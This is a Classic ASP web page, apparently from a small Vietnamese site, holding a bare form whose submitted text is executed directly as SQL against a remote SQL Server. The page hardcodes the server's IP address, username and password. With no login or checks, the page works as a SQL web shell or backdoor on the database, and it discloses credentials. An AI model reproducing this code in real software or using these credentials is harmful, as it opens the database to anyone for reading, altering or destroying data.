<%@LANGUAGE="VBSCRIPT" CODEPAGE="65001"%>
<%
if Request.ServerVariables("REQUEST_METHOD")="POST" then
	strSQLServerName = "184.168.194.60"
	strSQLDBUserName = "tinhdaucmt"
	strSQLDBPassword = "1234$"
	strSQLDBName = "tinhdaucmt_db"
	Set objCon=Server.CreateObject("ADODB.Connection")
	strConn="Provider=SQLOLEDB;User ID="&strSQLDBUserName&";Password="&strSQLDBPassword&";Initial Catalog="&strSQLDBName&";Data Source="&strSQLServerName
	objCon.Open strConn
	content= Request.Form("content")
	objCon.execute(content)
	str="Cập nhật thành công"
end if
%>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>Untitled Document</title>
</head>

<body>
<center><%=str%>
<form id="form1" name="form1" method="post" action="">
  <textarea name="content" style="width:100%" rows="15"></textarea><input name="submit" type="submit" value="Submit" />
</form></center>
</body>
</html>
